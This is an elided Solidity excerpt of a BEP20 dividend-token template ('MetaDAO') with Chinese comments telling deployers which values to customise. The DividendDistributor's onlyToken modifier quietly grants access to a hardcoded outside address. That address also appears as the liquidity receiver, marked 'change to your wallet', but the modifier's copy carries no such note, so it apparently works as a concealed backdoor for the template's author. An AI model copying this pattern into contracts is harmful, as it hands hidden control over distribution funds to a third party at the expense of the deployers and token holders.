...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x4E79E9C84668E90E2960339433E1bF5132ac8a32)); _;
    }
...
contract MetaDAO is IBEP20 , Auth, BaseToken {
    ...
    uint8 constant _decimals = 0;//想要多少精度自己改

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress= 0x10ED43C718714eb63d5aA57B78B54704E256024E;//不要改
    address RewardToken = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;//要分红的代笔合约
    ...
    constructor(
        ...
        _totalSupply = 1000000000 ;//改你想要的总量
		...
		_maxTxAmount = _totalSupply;//限购数量
		_walletMax = _totalSupply;//钱包持仓数量
		swapThreshold = _totalSupply.mul(2).div(100000);//合约中代币换成BNB的可卖出代笔数量
        ...
        // NICE!
        autoLiquidityReceiver = 0x4E79E9C84668E90E2960339433E1bF5132ac8a32;//改成你的钱包地址
        marketingWallet = 0xb3a8c1800eE81678AD7438624Cebe00C74888888;  //marketingwallet//你的营销地址
        team  = 0xb3a8c1800eE81678AD7438624Cebe00C74888888;//你的团队钱包地址
